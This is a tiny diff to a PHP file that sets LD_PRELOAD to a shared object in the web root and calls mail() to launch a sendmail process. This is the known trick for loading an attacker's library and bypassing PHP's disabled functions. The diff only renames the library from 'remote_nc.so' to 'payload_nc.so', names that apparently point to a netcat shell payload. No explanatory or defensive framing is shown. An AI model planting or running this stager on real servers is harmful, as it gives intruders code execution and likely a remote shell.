@@ -1,4 +1,4 @@
 <?php
-putenv("LD_PRELOAD=/var/www/html/remote_nc.so");
+putenv("LD_PRELOAD=/var/www/html/payload_nc.so");
 mail("@localhost","","","","");
 ?>
